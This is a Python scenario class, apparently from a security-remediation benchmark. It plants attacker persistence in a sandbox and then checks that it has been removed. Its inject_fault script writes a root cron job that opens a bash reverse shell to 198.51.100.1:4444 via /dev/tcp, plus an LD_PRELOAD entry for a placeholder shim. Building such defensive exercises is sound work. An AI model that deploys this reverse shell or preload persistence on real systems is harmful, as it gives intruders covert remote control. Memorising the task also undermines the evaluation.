"""Scenario: OSQuery threat hunting, hidden rootkit shims, and malicious cron persistence."""

from __future__ import annotations

import logging

from sandbox.base import BaseSandbox
from scenarios.base_scenario import BaseScenario
from security.threat_hunting import OSQueryThreatHunter

logger = logging.getLogger("os_autofix.scenarios.threat_hunt_persistence")


class ThreatHuntPersistenceScenario(BaseScenario):
    """Injects hidden LD_PRELOAD userland rootkit shims and unauthorized cron reverse shell backdoors."""

    name = "threat_hunt_persistence"
    description = "Malicious actors established persistence via unauthorized cron reverse shells (/etc/cron.d/backdoor_persist) and hidden LD_PRELOAD shims (/etc/ld.so.preload)."
    category = "Security / Threat Hunting"
    difficulty = "hard"
    max_steps = 8

    def __init__(self) -> None:
        super().__init__()
        self.hunter = OSQueryThreatHunter()

    async def setup(self, sandbox: BaseSandbox) -> bool:
        """Ensure clean baseline before threat injection."""
        logger.info("Setting up baseline environment for %s...", self.name)
        res = await sandbox.execute("mkdir -p /etc/cron.d /var/spool/cron /lib/x86_64-linux-gnu")
        return res.exit_code == 0

    async def inject_fault(self, sandbox: BaseSandbox) -> bool:
        """Inject malicious cron backdoor and LD_PRELOAD persistence."""
        logger.info("Injecting persistence mechanisms and rootkit shims into %s...", self.name)
        injection_script = """
# 1. Malicious cron reverse shell
cat << 'EOF' > /etc/cron.d/backdoor_persist
# Malicious persistence backdoor
* * * * * root /bin/bash -c "bash -i >& /dev/tcp/198.51.100.1/4444 0>&1"
EOF
chmod 0644 /etc/cron.d/backdoor_persist

# 2. Hidden LD_PRELOAD rootkit shim
touch /lib/x86_64-linux-gnu/libevil_shim.so
echo "/lib/x86_64-linux-gnu/libevil_shim.so" > /etc/ld.so.preload
chmod 0644 /etc/ld.so.preload
"""
        res = await sandbox.execute(injection_script)
        return res.exit_code == 0

    async def verify(self, sandbox: BaseSandbox) -> tuple[bool, str]:
        """Verify that all persistence mechanisms are eradicated while legitimate services remain intact."""
        logger.info("Running OSQuery forensic threat hunting verification on %s...", self.name)

        # 1. Run automated threat hunt
        report = await self.hunter.run_full_threat_hunt(sandbox, target_name=self.name)
        if not report.clean or report.critical_high_count > 0:
            reasons = [f"{f.rule_name} in {f.evidence}" for f in report.findings]
            return False, f"Threat hunting detected unresolved active threats: {'; '.join(reasons)}"

        # 2. Ensure /etc/ld.so.preload is removed or empty
        res_preload = await sandbox.execute("cat /etc/ld.so.preload 2>/dev/null || true")
        if res_preload.stdout.strip():
            return False, f"Residual LD_PRELOAD entries present: {res_preload.stdout.strip()}"

        # 3. Ensure malicious cron backdoor is removed
        res_cron = await sandbox.execute("test -f /etc/cron.d/backdoor_persist")
        if res_cron.exit_code == 0:
            return (
                False,
                "Malicious cron file '/etc/cron.d/backdoor_persist' still exists on filesystem.",
            )

        return (
            True,
            "All forensic persistence mechanisms, rootkits, and reverse shells successfully purged.",
        )
